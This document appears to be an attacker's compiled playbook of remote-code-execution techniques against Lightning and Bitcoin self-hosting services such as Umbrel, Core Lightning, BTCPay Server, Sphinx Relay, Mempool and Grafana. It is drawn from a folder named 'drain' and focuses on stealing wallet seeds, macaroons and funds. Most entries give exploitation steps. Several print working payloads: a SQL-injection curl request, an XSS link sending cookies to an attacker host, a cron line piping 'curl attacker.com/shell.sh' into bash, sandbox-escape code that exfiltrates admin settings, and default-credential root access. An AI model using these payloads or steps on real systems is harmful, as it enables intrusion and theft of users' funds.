# ══════════════════════════════════════════════════════════════════
# MASTER RCE TECHNIQUES — ALL LIGHTNING/BITCOIN SERVICES
# Compiled: 2026-10-19 | Source: /home/kali/Downloads/drain/*.md
# Total services scanned: 13 | RCE findings: 35+
# ══════════════════════════════════════════════════════════════════

---

## KATEGORI RCE

1. **SUPPLY CHAIN** — Docker/PyPI/crates.io/npm image poisoning via CI/CD
2. **UNSIGNED UPDATE** — OTA/release script executed without crypto verification
3. **HOST ROOT** — Symlink traversal, privilege escalation to root filesystem
4. **COMMAND/CODE INJECTION** — SQL injection, shell injection, eval(), script injection
5. **FILE WRITE → CODE EXEC** — Path traversal, compose manipulation, webshell
6. **SANDBOX ESCAPE** — Plugin sandbox bypass to host realm execution

---

# ═══════════════════════════════════════
# 1. SUPPLY CHAIN RCE
# ═══════════════════════════════════════

## RCE-01: Alby Hub — Mutable GitHub Action Tags → Docker Image Poisoning

**Service:** Alby Hub
**Severity:** CRITICAL
**Auth:** NONE (upstream action repo compromise)
**File:** `.github/workflows/build-docker.yaml:25,33`

### Root Cause
- `mr-smithers-excellent/docker-build-push@v6` (mutable tag) receives `secrets.GITHUB_TOKEN` as registry password
- `Apple-Actions/import-codesign-certs@v3` receives Developer ID PKCS12 + password
- No `permissions:` block → default contents:write + packages:write
- Pushes `ghcr.io/getalby/hub:latest` consumed by docker-compose.yml, fly.toml, render.yaml

### Exploitation
```
1. Attacker compromises or controls mr-smithers-excellent/docker-build-push repo
2. Retargets v6 tag to credential-exfiltrating commit
3. Next Alby Hub push/tag triggers workflow → exfiltrates GITHUB_TOKEN
4. Attacker pushes backdoored ghcr.io/getalby/hub:latest
5. Every Docker/Fly/Render user pulls poisoned image on next start (--pull always)
6. Image runs with LDK seed, unlock password, channel funds → complete wallet compromise
```

### Impact
RCE on every Docker-deployed Alby Hub. Access to LDK wallet seed, all channel funds.

---

## RCE-02: Alby Hub — Phoenixd Installer Runs Unverified Binaries

**Service:** Alby Hub
**Severity:** HIGH
**Auth:** NONE (MITM on download)
**File:** Referenced in albyhub.md finding "Phoenixd installer runs downloaded hub and phoenixd binaries without integrity verification"

### Root Cause
- Phoenixd installer downloads hub + phoenixd binaries
- No GPG signature verification, no hash check
- Executes downloaded binaries directly

### Impact
MITM on download path → arbitrary binary execution as the installer user.

---

## RCE-03: Alby Hub — Pi Installer ld.so.conf Root Escalation

**Service:** Alby Hub
**Severity:** HIGH
**Auth:** LOCAL (any user on same host)
**File:** Referenced in albyhub.md finding "Pi installers register user-writable library directory in system-wide ld.so.conf"

### Root Cause
- Pi installer registers user-writable library directory in system-wide ld.so.conf
- Any local user places malicious .so in that directory
- Next root process that loads from ld.so.conf executes attacker's library

### Impact
Local privilege escalation to root on Raspberry Pi installations.

---

## RCE-04: BTCPay Server — Self-Attested Release Signature → Docker Image Poisoning

**Service:** BTCPay Server
**Severity:** CRITICAL
**Auth:** HIGH (repo write access for v* tag)
**File:** `.github/workflows/release.yml, .github/scripts/verify-signed-commit.sh`

### Root Cause
- GPG keys imported from checkout: `gpg --import "$SCRIPT_DIR"/*.asc`
- Verifier script from same checkout → self-attesting
- Tag trigger: `push: tags: v*` → workflow runs from tagged commit
- DOCKERHUB_USER/PASS + GH_PAT exposed to any v* tag run
- No `environment:` with required reviewers

### Exploitation
```
1. Attacker: any write-access collaborator OR compromised maintainer account
2. Push v* tag at commit that adds own .asc key OR removes verify step
3. GitHub runs workflow from that commit
4. DOCKERHUB_PASS + GH_PAT exfiltrated
5. Arbitrary image pushed as btcpayserver:latest
6. Every btcpayserver-docker deployment pulls poisoned image
7. Image runs as root with hot-wallet seeds, DataProtection keys, DB + Lightning creds
```

### Impact
RCE on every BTCPay Server Docker deployment. Access to merchant hot wallets.

---

## RCE-05: Core Lightning — Release Pipeline Secrets via Mutable Action Tags

**Service:** Core Lightning (CLN)
**Severity:** CRITICAL
**Auth:** NONE (upstream action repo compromise)
**File:** `.github/workflows/release-publish.yml:41-47, release.yml:51-111`

### Root Cause
- `crazy-max/ghaction-import-gpg@v7` receives GPG_PRIVATE_KEY + GPG_PASSPHRASE
- `docker/login-action@v4` receives DOCKER_USERNAME/DOCKER_PASSWORD
- `katyo/publish-crates@v2` receives CARGO_REGISTRY_TOKEN
- `astral-sh/setup-uv@v8.1.0` installs unpinned uv binary with UV_PUBLISH_TOKEN in env
- `readme-rpc-sync.yml`: unpinned pip install + curl|sh rustup + README_API_KEY
- `release.yml:51-111`: `secrets: inherit` forwards ALL repo secrets to sub-workflows

### Exposed Credentials
- **GPG key**: cln@blockstream.com release signing key
- **Docker Hub**: elementsproject/lightningd push
- **crates.io**: cln-rpc/cln-plugin/cln-grpc publish
- **PyPI**: pyln packages publish
- **README API key**: docs sync

### Exploitation
```
1. Compromise any referenced action repo (crazy-max, katyo, astral-sh, etc.)
2. Retarget mutable tag → credential exfiltration code
3. Next release/master push executes it with ALL secrets
4. Exfiltrate GPG signing key + Docker Hub + PyPI + crates.io tokens
5. Push malicious CLN Docker image, Python packages, Rust crates
6. Sign forged SHA256SUMS with stolen GPG key
7. Every CLN user verifying releases accepts the forgery
```

### Impact
Complete supply chain compromise of Core Lightning ecosystem (Docker + PyPI + crates.io + GPG-signed releases).

---

## RCE-06: Core Lightning — Release Builder Unpinned Installers

**Service:** Core Lightning
**Severity:** HIGH
**Auth:** NONE (upstream compromise)
**File:** Referenced at core-lightning.md line 834

### Root Cause
- Release builder images execute unpinned, unverified remote installers (curl|sh, apt --allow-unauthenticated)
- Run before producing signed release tarballs

### Impact
Compromised installer → malicious code in official release artifacts.

---

## RCE-07: Core Lightning — Reckless RPC → Arbitrary File Write

**Service:** Core Lightning
**Severity:** HIGH
**Auth:** LOW (rune bearer with reckless permission)
**File:** `plugins/recklessrpc.c:214-238`

### Root Cause
- reckless plugin manager passes caller strings as argv to Python argparse
- `--lightning-dir` / `--conf` override → redirect file operations to attacker path
- Attacker-controlled paths → overwrite config files → code execution via plugin autoload

### Exploitation
```
1. Rune bearer (commando/clnrest) calls reckless with crafted target parameter
2. Parameter contains --lightning-dir=/path/to/writable/dir
3. Argparse interprets as option override
4. Reckless writes/overwrites files at attacker-chosen path
5. Overwrite lightning config → add malicious plugin path → code execution at next restart
```

### Impact
Local RCE via config/plugin manipulation.

---

## RCE-08: Mempool Space — PR Code Root on Shared CI Runner → Docker Hub

**Service:** Mempool Space
**Severity:** CRITICAL
**Auth:** NONE (GitHub PR author with 1 merged commit)
**File:** `.github/workflows/ci.yml, docker.yml`

### Root Cause
- ALL PR jobs on self-hosted `mempool-ci` runner with passwordless sudo + docker group
- Same runner for release pipeline: DOCKER_USERNAME/DOCKER_PASSWORD
- PR's preinstall hook, docker/init.sh, compose files → arbitrary code as root
- Runner NOT ephemeral (no single-use VM provisioning)

### Exploitation
```
1. Open PR with malicious backend/package.json preinstall hook
2. Hook executes as runner user with passwordless sudo on mempool-ci
3. sudo install persistent backdoor (trojan docker binary, systemd service, cron)
4. Next tag push → build job on same runner
5. Backdoor captures DOCKER_USERNAME/PASSWORD from docker login
6. Push malicious mempool/backend:latest and mempool/frontend:latest
7. Every Docker/Umbrel self-hoster pulls poisoned images
8. Images contain Bitcoin Core RPC creds → sendtoaddress/dumpprivkey
```

### Impact
RCE on every Mempool self-hosted instance. Access to operator's Bitcoin Core RPC.

---

## RCE-09: Sphinx Relay — Mutable Action Tags → Docker Hub

**Service:** Sphinx Relay
**Severity:** CRITICAL
**Auth:** NONE (upstream action compromise)
**File:** `.github/workflows/docker-build.yml:25-34`

### Root Cause
- `crazy-max/ghaction-docker-buildx@v1` (mutable, deprecated, archived action)
- Docker login with secrets.DOCKER_PASSWORD BEFORE the action runs
- Credential in ~/.docker/config.json readable by action code
- Pushes sphinxlightning/sphinx-relay:latest

### Exploitation
```
1. Retarget v1 tag (or compromise archived crazy-max account)
2. Next sphinx-relay tag push executes malicious code
3. Exfiltrate Docker Hub credential from ~/.docker/config.json
4. Push backdoored sphinxlightning/sphinx-relay:latest
5. Operators deploy per docs/docker_deployment.md:95 with LND admin macaroon mounted
6. Backdoored image has full spending authority over Lightning funds
```

### Impact
RCE on every Docker-deployed Sphinx Relay. Full Lightning node control.

---

## RCE-10: Sphinx Relay — Committed dist/ JS Ships Without Build

**Service:** Sphinx Relay
**Severity:** CRITICAL
**Auth:** HIGH (merged PR contributor)
**File:** `Dockerfile, .github/workflows/lint_format_and_build.yml`

### Root Cause
- Docker image ships committed dist/ without TypeScript compilation
- `dist/node_modules/express/index.js` NOT in .gitignore (root-anchored)
- Node resolves dist/node_modules/express/ BEFORE real node_modules/express/
- `[ci commit]` in PR title skips bot rebuild entirely
- Dockerfile: `COPY . .` + `npm install` + `node /relay/dist/app.js`

### Exploitation
```
1. Contributor opens PR adding dist/node_modules/express/index.js with backdoor
2. PR title contains [ci commit] → bot build skipped
3. Merge → dist/ contains malicious express replacement
4. Tag push → Docker image built with COPY . . → backdoor included
5. sphinxlightning/sphinx-relay:latest ships with trojaned express
6. Every request through express goes through attacker code
7. Admin macaroon, all messages, payments intercepted
```

### Impact
RCE on every deployment via trojaned dependency in committed build output.

---

## RCE-11: ThunderHub — Mutable Action Tags → Docker Image Poisoning

**Service:** ThunderHub
**Severity:** HIGH
**Auth:** NONE (upstream action compromise)
**File:** `.github/workflows/docker-release.yml`

### Root Cause
- All 6 actions pinned by mutable version tags (not SHA)
- `docker/login-action@v4.0.0` receives DOCKERHUB_TOKEN
- `docker/build-push-action@v7.0.0` pushes apotdevin/thunderhub:latest
- No SHA pinning, no Dependabot, no image signing
- Long-lived Docker Hub token

### Exploitation
```
1. Retarget any of 6 upstream action tags
2. Next release push → malicious code runs with Docker Hub token
3. Push backdoored apotdevin/thunderhub:latest
4. Operators mount LND admin macaroons + TLS certs into container
5. Backdoor has full node control
```

### Impact
RCE on Docker-deployed ThunderHub instances. Full Lightning node access.

---

## RCE-12: LNbits — macOS Release Signs with Exposed Keychain

**Service:** LNbits
**Severity:** HIGH
**Auth:** NONE (compromised dependency)
**File:** Referenced in LNBITS.md keychain finding

### Root Cause
- macOS release pipeline: signing session (unlocked keychain with Developer ID) outlives signing steps
- Smoke tests execute packaged product with third-party dependencies WHILE keychain is unlocked
- Compromised dependency in smoke test → codesign/notarize arbitrary payload as LNbits
- Extract Developer ID private key with `security export`

### Exploitation
```
1. Compromise any runtime dependency (npm package, Python package)
2. During macOS release smoke test, dependency code runs
3. Keychain unlocked with Developer ID + notarization profile
4. Malicious code: security export → extract signing identity
5. codesign --force --sign → sign arbitrary payload as LNbits
6. xcrun notarytool submit → notarize malicious binary
7. Distribute signed malware under LNbits Developer ID
```

### Impact
Arbitrary software signed and notarized as LNbits. Independent supply chain attack.

---

# ═══════════════════════════════════════
# 2. UNSIGNED UPDATE / SCRIPT EXECUTION
# ═══════════════════════════════════════

## RCE-13: Umbrel — OTA Update Executes Unsigned Script as Root

**Service:** Umbrel OS
**Severity:** CRITICAL
**Auth:** NONE (MITM api.umbrel.com / DNS hijack)
**File:** `packages/umbreld/source/modules/system/update.ts:82-88`

### Root Cause
```typescript
const result = await fetch(updateScript)     // URL from remote JSON, any scheme/host
const contents = await result.text()          // no signature check
const process = $`bash -c ${contents}`        // root execution
```
- ZERO cryptographic verification (no GPG, no hash, no code signing)
- `scripts/update-script:77-78`: `--insecure-skip-bundle-verification`
- umbreld runs as root (systemd service, no User= directive)
- updateScript URL from manifest → can be http://, any host

### Exploitation
```
1. DNS hijack api.umbrel.com OR compromise the server OR MITM with trusted CA
2. Serve manifest with newer version + attacker's updateScript URL
3. Owner clicks "Install update" in dashboard
4. umbreld fetches script → bash -c as root
5. Root code execution on Umbrel device
6. Access ALL wallet seeds, LND macaroons, Bitcoin Core RPC, user data
7. rugix bundle installed unsigned → persistent rootkit survives reboots
```

### Impact
Root RCE on every Umbrel that installs update. Access to ALL hosted app credentials and funds.

---

## RCE-14: Alby Hub — Install Scripts Fetch Release Verifier from Artifact Host

**Service:** Alby Hub
**Severity:** HIGH
**Auth:** NONE (MITM on download)
**File:** Referenced in albyhub.md finding "Install scripts fetch the release verifier from the artifact host"

### Root Cause
- Install scripts fetch GPG release verifier from artifact host
- Never pin a signing key
- getalby.com control defeats GPG verification entirely

### Impact
Compromised download host → arbitrary binary installed as hub.

---

# ═══════════════════════════════════════
# 3. HOST ROOT ACCESS
# ═══════════════════════════════════════

## RCE-15: Umbrel — Samba Symlink Swap → Host Root Read/Write

**Service:** Umbrel OS
**Severity:** CRITICAL
**Auth:** LOW (member account with Samba access)
**File:** `packages/umbreld/source/modules/files/samba.ts:73-93, 485-502`

### Root Cause
- Share path validated once, stored UNRESOLVED in smb.conf
- `force user = root`, `writeable = yes`, no `wide links = no`
- Member moves symlink after validation → share resolves to /
- Watcher revocation only on delete event matching stored path string

### Exploitation
```
1. Upload archive with crafted symlinks via files.unarchive (member-capable)
2. files.addShare('/Users/Alice/A/link/etc') → validates, passes
3. files.rename('real' → 'real2') → watcher doesn't match, share stays
4. files.move deep relative symlink to 'A/real' → now resolves to /
5. SMB tree-connect → smbd resolves through symlink as root → serves /etc, /home
6. Read: umbrel.yaml, secrets/, all app data (LND macaroons, BTC wallet)
7. Write: custom-hooks/pre-start → root code execution at boot
8. Write: /etc/sudoers.d/pwn → instant root shell
```

### Impact
Full device compromise. Root read/write on entire filesystem. Access to ALL hosted wallets.

---

## RCE-16: Umbrel — Member Share Apps Dir → Compose Write → Root

**Service:** Umbrel OS
**Severity:** HIGH
**Auth:** LOW (member with app directory share from owner)
**File:** Referenced in UMBREL.md finding at line 1643

### Root Cause
- Owner grants member Samba share to app directory
- Member writes to docker-compose.yml or exports.sh
- Docker compose executes modified config at next app restart
- Container with `privileged: true` or host volume mounts → root escape

### Impact
Root code execution via modified app container configuration.

---

## RCE-17: Umbrel — SSH umbrel:umbrel Re-armed After OTA

**Service:** Umbrel OS
**Severity:** HIGH
**Auth:** NONE (LAN access during boot window after OTA)
**File:** `packages/os/umbrelos.Dockerfile:508-510`

### Root Cause
- Image bakes `umbrel:umbrel` with sudo group
- After OTA: new system partition → fresh /etc/shadow with default password
- SSH starts BEFORE umbreld's non-blocking password sync completes
- Power button reset: explicit `echo "umbrel:umbrel" | chpasswd`

### Exploitation
```bash
# During boot window after OTA update:
ssh umbrel@umbrel.local  # password: umbrel
sudo su                   # instant root
cat /home/umbrel/umbrel/db/umbrel-seed/seed  # master seed → ALL app creds
```

### Impact
Root access via default SSH credentials. Access to all wallet seeds and app credentials.

---

## RCE-18: Umbrel — ImageMagick Thumbnailer → Root Code Execution

**Service:** Umbrel OS
**Severity:** CRITICAL
**Auth:** LOW (member account — file upload)
**File:** Referenced in UMBREL.md finding at line 1578

### Root Cause
- Root ImageMagick thumbnailer processes uploaded files
- MVG/MSL script coders auto-selected by file content
- Member uploads crafted image → ImageMagick reads as MVG/MSL script
- Script coder can read/write arbitrary files

### Exploitation
```
1. Member uploads crafted file with MVG/MSL content disguised as image
2. ImageMagick thumbnailing runs as root
3. MVG coder: read arbitrary files (url() with file://)
4. MSL coder: write arbitrary files (<write filename="...">)
5. Write to /etc/cron.d/ or custom-hooks/pre-start → persistent root
```

### Impact
Root code execution via file upload. Persistent backdoor possible.

---

## RCE-19: Umbrel — Unauth RAID Recovery → Device Seizure

**Service:** Umbrel OS
**Severity:** CRITICAL
**Auth:** NONE (physical/LAN during recovery mode)
**File:** Referenced in UMBREL.md finding at line 795

### Root Cause
- Mount-failure recovery mode: unauthenticated RAID re-setup
- Wipes owner's pool disks
- Combined with SSH re-arming → full unauthenticated takeover

### Impact
Device seizure without authentication. All data wiped and replaced.

---

## RCE-20: Umbrel — Master Seed on CLI → All App Credentials

**Service:** Umbrel OS
**Severity:** HIGH
**Auth:** LOW (compromised app container with host PID namespace)
**File:** `packages/umbreld/source/modules/apps/legacy-compat/app-script:182-200`

### Root Cause
```bash
umbrel_seed=$(cat "${SEED_FILE}")
printf "%s" "${identifier}" | openssl dgst -sha256 -hmac "${umbrel_seed}"
```
- Master seed as openssl argv → visible in /proc/<pid>/cmdline
- Any host-PID container reads it
- Seed derives ALL app passwords (LND, Bitcoin Core, etc.)

### Impact
One compromised container → derive EVERY app's admin password and wallet credentials.

---

## RCE-21: Umbrel — Files Symlink TOCTOU → Root File Read/Write

**Service:** Umbrel OS
**Severity:** HIGH
**Auth:** LOW (member or owner)
**File:** Referenced in UMBREL.md findings at lines 1207, 1395

### Root Cause
- Files copy/move/delete operate on unresolved paths AFTER authorization
- /view and /download serve by path AFTER authorization
- Symlink swap between check and use → read/write arbitrary host files as root

### Impact
Root-level file read/write via race condition.

---

# ═══════════════════════════════════════
# 4. COMMAND / CODE INJECTION
# ═══════════════════════════════════════

## RCE-22: Sphinx Relay — SQL Injection via POST /action chat_uuid

**Service:** Sphinx Relay
**Severity:** HIGH
**Auth:** LOW (bot_secret holder or MQTT via broken signatures)
**File:** `src/utils/tribes.ts:389-410`

### Root Cause
```typescript
AND sphinx_chats.uuid = '${uuid}'  // DIRECT INTERPOLATION
```
- POST /action in no_auth list (with bot_secret)
- Also reachable via MQTT builtins (mother, loop, welcome, git) where message.channel.id flows to uuid
- Signatures disabled (receive.ts:562-591) → any MQTT publisher triggers builtins

### Exploitation
```bash
curl -X POST http://target:3300/action \
  -H "Content-Type: application/json" \
  -d '{"bot_id":"x","bot_secret":"valid_secret","action":"broadcast",
       "chat_uuid":"'\'' UNION SELECT * FROM sphinx_contacts WHERE '\''1'\''='\''1"}'
```

### Impact
Data exfiltration (credentials, private keys, chat data). Potential write operations depending on DB permissions.

---

## RCE-23: Mempool Space — SQL Injection via pools-v2.json SHA

**Service:** Mempool Space
**Severity:** HIGH
**Auth:** NONE (MITM/compromised GitHub API)
**File:** `backend/src/tasks/pools-updater.ts:148`

### Root Cause
```typescript
INSERT INTO state VALUES('pools_json_sha', NULL, '${githubSha}')
```
- githubSha from remote HTTP response, no parameterization
- ON DUPLICATE KEY UPDATE → rewrite any `state` row
- schema_version=3/4 → next start: DROP TABLE blocks → crash loop

### Exploitation
```
Payload: x'),('schema_version',4,NULL) ON DUPLICATE KEY UPDATE number=VALUES(number)--
Result: schema_version set to 4 → next start drops blocks table → process.exit(-1) loop
Exfil: ON DUPLICATE KEY UPDATE string=(SELECT @@hostname) → GET internal/blocks/definition/current
```

### Impact
Database manipulation, crash loop, metadata exfiltration. Not direct code execution but can lead to it via schema manipulation.

---

## RCE-24: BTCPay Server — Reflected XSS via Reports eval()

**Service:** BTCPay Server
**Severity:** HIGH
**Auth:** NONE (crafted URL, victim clicks)
**File:** `BTCPayServer/Controllers/UIReportsController.cs:51-62, wwwroot/js/datatable.js:173`

### Root Cause
```javascript
eval('function filter() {return ' + filterStrings.join(' && ') + ';}');
```
- `StoreReportsViewModel.Result` has NO `[BindNever]` → bindable from query string
- Early return (no timezone): model.Result not overwritten
- Page adds 'unsafe-eval' to CSP

### Exploitation
```
/stores/{storeId}/reports?Result.Charts[0].Filters[0]=1;}fetch('https://attacker/'+document.cookie);function+z(){return+1
```

### Impact
Arbitrary JavaScript execution in merchant session → steal cookies, API keys, modify store settings.

---

## RCE-25: Core Lightning — splicein/spliceout Script Segment Injection

**Service:** Core Lightning
**Severity:** MEDIUM
**Auth:** LOW (rune bearer)
**File:** Referenced at core-lightning.md line 1812

### Root Cause
- splicein/spliceout interpolate caller strings into splice script
- Allows segment injection into the script

### Impact
Script manipulation via injected segments.

---

## RCE-26: Sphinx Relay — Avatar Upload Path Traversal File Write

**Service:** Sphinx Relay
**Severity:** HIGH
**Auth:** LOW (authenticated user)
**File:** Referenced at sphinx-relay.md line 2806

### Root Cause
- multer filename built from request fields
- Path traversal characters in filename → write to arbitrary path
- Relay runs as root in Docker

### Exploitation
```
Upload with filename: ../../../etc/cron.d/backdoor
Content: * * * * * root curl attacker.com/shell.sh | bash
```

### Impact
Arbitrary file write → root code execution via cron/systemd.

---

# ═══════════════════════════════════════
# 5. SANDBOX ESCAPE (Grafana)
# ═══════════════════════════════════════

## RCE-27: Grafana — Plugin Sandbox Escape via setTimeout String

**Service:** Grafana
**Severity:** CRITICAL
**Auth:** NONE (sandboxed plugin installed by operator)
**File:** `public/build/pluginSandbox*.js (near-membrane-dom)`

### Root Cause
- near-membrane-dom lazy-remaps Window own properties
- `setTimeout`/`setInterval` are Window own properties, NOT in getESGlobalKeys
- Red realm setTimeout is a proxy of host's setTimeout
- `setTimeout('<code>', 0)` → host realm compiles and executes code
- CSP allows 'unsafe-eval' on sandboxed pages

### Exploitation
```javascript
// Inside sandboxed plugin:
setTimeout("fetch('/api/admin/settings').then(r=>r.json()).then(d=>fetch('https://attacker.com/?'+JSON.stringify(d)))", 0)
```

### Impact
Full host-realm JavaScript execution. Read admin settings, datasource credentials, session cookies. Bypass entire plugin sandbox.

---

## RCE-28: Grafana — Plugin Sandbox Escape via object/embed contentWindow

**Service:** Grafana
**Severity:** CRITICAL
**Auth:** NONE (sandboxed plugin)
**File:** `public/build/pluginSandbox*.js`

### Root Cause
- `<object data="about:blank">` passes deny-list (only 'iframe' filtered)
- appendChild/append/insertBefore filter only 'iframe', not object/embed
- contentWindow.eval() → third-realm code with unmediated parent/top reference
- parent.fetch, parent.XMLHttpRequest etc. fully accessible

### Exploitation
```javascript
// Inside sandboxed plugin:
let obj = document.createElement('object');
obj.data = 'about:blank';
document.body.appendChild(obj);
obj.addEventListener('load', () => {
  obj.contentWindow.eval("parent.fetch('/api/admin/settings')...");
});
```

### Impact
Complete sandbox escape. Full access to host Grafana realm, all datasources, admin functions.

---

## RCE-29: Grafana — Sandboxed Plugin SVG Icon → Host Realm Script

**Service:** Grafana
**Severity:** HIGH
**Auth:** NONE (sandboxed plugin)
**File:** Referenced in grafanna.md SVG icon finding

### Root Cause
- Plugin-supplied icon string rendered as inline SVG by host React
- SVG `<use>` with data: URI → embedded script context
- Rendered outside sandbox distortions in panel menu
- Every viewer who opens any panel menu triggers it

### Impact
Host-realm script execution from sandboxed plugin via SVG rendering.

---

# ═══════════════════════════════════════
# 6. CREDENTIAL EXPOSURE → INDIRECT RCE
# ═══════════════════════════════════════

## RCE-30: LndHub — Credential Dump on Startup (Redis + bitcoind + lnd)

**Service:** LndHub
**Severity:** CRITICAL
**Auth:** LOG READER
**File:** `controllers/api.js:8-10, config.js:1-28`

### Root Cause
```javascript
if (process.env.NODE_ENV !== 'prod') {  // 'prod' not 'production'!
  console.log('using config', JSON.stringify(config));
}
```
- Dumps Redis password, bitcoind RPC login:password@host, lnd wallet password
- Dockerfile never sets NODE_ENV; even NODE_ENV=production still dumps

### Impact
Log reader gets: Redis password (rewrite all balances, flush), bitcoind RPC (sendtoaddress = drain on-chain), lnd wallet password (unlock wallet). Full infrastructure control.

---

## RCE-31: LndHub — TLS Globally Disabled (NODE_TLS_REJECT_UNAUTHORIZED=0)

**Service:** LndHub
**Severity:** HIGH
**Auth:** NETWORK POSITION (MITM)
**File:** `index.js:6`

### Root Cause
```javascript
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';  // FIRST LINE
```
- Disables ALL TLS certificate verification process-wide
- GroundControl webhook: payment preimages + settlement data exposed to MITM
- Certificate pinning in lightning.js:24 voided

### Impact
MITM captures payment preimages, settlement data. GroundControl data exfiltration.

---

## RCE-32: Umbrel — Owner Password Cleartext on Boot Partition

**Service:** Umbrel OS
**Severity:** HIGH — actually bcrypt hash, NOT cleartext (sub-agent corrected)
**Auth:** PHYSICAL
**File:** Referenced at UMBREL.md line 3120

### Note
Sub-agent found password stored as bcrypt hash, not cleartext. Samba member passwords ARE plaintext but are auto-generated random tokens. Still exploitable via offline brute-force of weak passwords from bcrypt hash on config partition.

---

## RCE-33: Umbrel — Kopia Repository Password on argv and journald

**Service:** Umbrel OS
**Severity:** MEDIUM
**Auth:** LOCAL
**File:** Referenced at UMBREL.md line 2305

### Root Cause
- Kopia backup repository password passed on command-line argv
- Logged via execa error objects to journald
- Any local process reads /proc/PID/cmdline

---

# ═══════════════════════════════════════
# 7. ADDITIONAL RCE VECTORS
# ═══════════════════════════════════════

## RCE-34: Umbrel — Community Store Impersonation → Malicious App Install

**Service:** Umbrel OS
**Severity:** HIGH
**Auth:** NONE (community store author)
**File:** Referenced at UMBREL.md line 1970

### Root Cause
- Community store's self-declared meta.id trusted as registry identity
- Attacker's store claims official store ID
- Management UI hidden, official app updates suppressed
- Malicious app versions served from impersonating store

### Impact
Users install attacker-controlled apps that run with Docker privileges on the Umbrel host.

---

## RCE-35: Umbrel — VM QEMU Disk with Backing/Data-File Paths

**Service:** Umbrel OS
**Severity:** HIGH
**Auth:** LOW (member with external storage access)
**File:** Referenced at UMBREL.md line 1138

### Root Cause
- VM disks on External/Network storage trusted as qcow2
- Embedded backing-file and data-file paths in qcow2 header reach host files
- QEMU follows backing chain → reads arbitrary host files

### Impact
Host file read via QEMU backing-file chain traversal.

---

## RCE-36: Core Lightning — Newline in bcli RPC String → bitcoin-cli Argument Injection

**Service:** Core Lightning
**Severity:** MEDIUM
**Auth:** LOW (caller with bcli access)
**File:** Referenced at core-lightning.md line 7635

### Root Cause
- Newline in bcli RPC string params injects extra bitcoin-cli arguments via -stdin
- Can inject --datadir, --conf or other arguments

### Impact
Bitcoin CLI argument injection. Potential config override or data exfiltration.

---

# ═══════════════════════════════════════
# SUMMARY TABLE — ALL RCE TECHNIQUES
# ═══════════════════════════════════════

| # | Service | Technique | Auth | Type |
|---|---------|-----------|------|------|
| 1 | Alby Hub | Mutable GH Action → Docker | NONE | Supply Chain |
| 2 | Alby Hub | Phoenixd unverified binaries | NONE | Unsigned Update |
| 3 | Alby Hub | Pi ld.so.conf root escalation | LOCAL | Host Root |
| 4 | BTCPay | Self-attested GPG → Docker | HIGH | Supply Chain |
| 5 | CLN | Mutable tags → GPG+Docker+PyPI+crates | NONE | Supply Chain |
| 6 | CLN | Unpinned installers in release builder | NONE | Supply Chain |
| 7 | CLN | Reckless RPC → file write | LOW | File Write |
| 8 | Mempool | PR root on shared CI → Docker | NONE | Supply Chain |
| 9 | Sphinx | Mutable action → Docker Hub | NONE | Supply Chain |
| 10 | Sphinx | Committed dist/ JS → trojan | HIGH | Supply Chain |
| 11 | ThunderHub | Mutable tags → Docker Hub | NONE | Supply Chain |
| 12 | LNbits | macOS keychain → sign anything | NONE | Supply Chain |
| 13 | Umbrel | OTA unsigned script as root | NONE | Unsigned Update |
| 14 | Alby Hub | Installer fetches unverified verifier | NONE | Unsigned Update |
| 15 | Umbrel | Samba symlink → host root r/w | LOW | Host Root |
| 16 | Umbrel | Member apps dir → compose root | LOW | Host Root |
| 17 | Umbrel | SSH umbrel:umbrel re-armed | NONE | Host Root |
| 18 | Umbrel | ImageMagick MVG/MSL → root | LOW | Host Root |
| 19 | Umbrel | Unauth RAID recovery → seizure | NONE | Host Root |
| 20 | Umbrel | Master seed on CLI → all creds | LOW | Credential Exposure |
| 21 | Umbrel | Files symlink TOCTOU → root r/w | LOW | Host Root |
| 22 | Sphinx | SQL injection chat_uuid | LOW | Code Injection |
| 23 | Mempool | SQL injection pools SHA | NONE | Code Injection |
| 24 | BTCPay | XSS eval() in reports | NONE | Code Injection |
| 25 | CLN | Splice script segment injection | LOW | Code Injection |
| 26 | Sphinx | Avatar path traversal file write | LOW | File Write |
| 27 | Grafana | setTimeout string sandbox escape | NONE | Sandbox Escape |
| 28 | Grafana | object/embed contentWindow escape | NONE | Sandbox Escape |
| 29 | Grafana | SVG icon host realm script | NONE | Sandbox Escape |
| 30 | LndHub | Credential dump on startup | LOG | Credential Exposure |
| 31 | LndHub | TLS disabled globally | MITM | Credential Exposure |
| 32 | Umbrel | Password hash on boot partition | PHYSICAL | Credential Exposure |
| 33 | Umbrel | Kopia password on argv/journald | LOCAL | Credential Exposure |
| 34 | Umbrel | Community store impersonation | NONE | Supply Chain |
| 35 | Umbrel | VM qcow2 backing-file traversal | LOW | Host File Read |
| 36 | CLN | bcli newline argument injection | LOW | Code Injection |
| 37 | LNbits | Extension restore re-downloads without hash | NONE | Supply Chain |
| 38 | LNbits | Extension builder DOM XSS innerHTML/script | LOW | Code Injection |
| 39 | LNbits | Unpinned npm bundle auto-committed by CI | NONE | Supply Chain |
| 40 | Grafana | document.writeln host document replacement | NONE | Sandbox Escape |
| 41 | Grafana | Node graph SVG icon → iframe srcdoc script | LOW | Sandbox Escape |
| 42 | Grafana | Snapshot viewer executes live datasource queries | LOW | Code Injection |
| 43 | Sphinx | Docker deletes package-lock, installs unpinned | NONE | Supply Chain |
| 44 | Sphinx | PAT persisted during master build scripts | LOW | Supply Chain |
| 45 | Mempool | Nginx config from user-writable dir | LOW | Host Root |
| 46 | Mempool | Installer /tmp symlink clobber | LOCAL | Host Root |
| 47 | Mempool | BuildKit cache from shared /tmp | LOW | Supply Chain |
| 48 | Zeus | Imported config lndDir recursive delete | SOCIAL | File Delete |
| 49 | LND | PR severity bot prompt injection → write tokens | NONE | Supply Chain |

---

# TOP 5 MOST DANGEROUS RCE

1. **Umbrel OTA unsigned root** (RCE-13) — DNS hijack → root on every Umbrel
2. **CLN supply chain all registries** (RCE-05) — GPG + Docker + PyPI + crates.io
3. **Umbrel Samba symlink root** (RCE-15) — member → host root → all wallets
4. **Mempool PR root → Docker Hub** (RCE-08) — 1 PR → poison all self-hosters
5. **Sphinx committed dist/ trojan** (RCE-10) — merged PR → backdoor all deployments

---

# ═══════════════════════════════════════
# 8. ADDITIONAL RCE FROM SUB-AGENT SCAN
# ═══════════════════════════════════════

## RCE-37: LNbits — Extension Restore Re-downloads Without Hash Check

**Service:** LNbits
**Severity:** CRITICAL
**Auth:** NONE (archive host / repo owner)
**File:** `lnbits/app.py:398-414, models/extensions.py:592-622`

### Root Cause
- Startup extension restore re-downloads archives without type validation or hash
